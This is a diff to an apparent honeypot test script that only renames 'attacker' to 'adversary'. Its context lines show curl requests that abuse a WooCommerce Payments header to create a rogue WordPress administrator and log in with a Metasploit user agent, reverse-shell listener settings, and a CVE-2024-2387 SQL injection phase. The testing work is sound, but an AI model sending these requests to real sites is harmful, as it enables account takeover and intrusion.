@@ -34,8 +34,8 @@
 #
 #   TARGET_HOST  IP or hostname of the reverse proxy   (default: 127.0.0.1)
 #   TARGET_PORT  HTTP port exposed by the reverse proxy (default: 80)
-#   LHOST        Attacker listener IP for reverse shell (default: 127.0.0.1)
-#   LPORT        Attacker listener port                 (default: 4444)
+#   LHOST        Adversary listener IP for reverse shell (default: 127.0.0.1)
+#   LPORT        Adversary listener port                 (default: 4444)
 #
 # EXIT CODES:
 #   0  All phases produced the expected outcomes.
@@ -326,14 +326,14 @@ else
         --header "X-WCPAY-PLATFORM-CHECKOUT-USER: 1" \
         --header "Content-Type: application/json" \
         --header "User-Agent: Mozilla/4.0 (compatible; Metasploit REXHTTP)" \
-        --data '{"username":"msf_attacker","password":"Msf@2024!","email":"msf@evil.example","roles":["administrator"]}'
+        --data '{"username":"msf_adversary","password":"Msf@2024!","email":"msf@evil.example","roles":["administrator"]}'
 
     # Authenticate as the new rogue account.
     check "${JAR_P2}" "Rogue admin login POST (sim)" "honeypot" \
         --request POST "${BASE_URL}/wp-login.php" \
         --header "Content-Type: application/x-www-form-urlencoded" \
         --header "User-Agent: Mozilla/4.0 (compatible; Metasploit REXHTTP)" \
-        --data "log=msf_attacker&pwd=Msf%402024%21&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"
+        --data "log=msf_adversary&pwd=Msf%402024%21&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"
 
     # Verify the session is now honeypot-bound.
     check "${JAR_P2}" "wp-admin access with rogue session (sim)" "honeypot" \
@@ -469,7 +469,7 @@ docker_output_check \
 # =============================================================================
 # PHASE 5 – SQL Injection Against Honeypot Database
 # =============================================================================
-# After obtaining a shell, an attacker would dump the WordPress database.
+# After obtaining a shell, an adversary would dump the WordPress database.
 # This phase:
 #   5a. Injects SQL via the CVE-2024-2387 vulnerable plugin URL parameter.
 #   5b. Directly queries the honeypot MySQL container via docker exec to
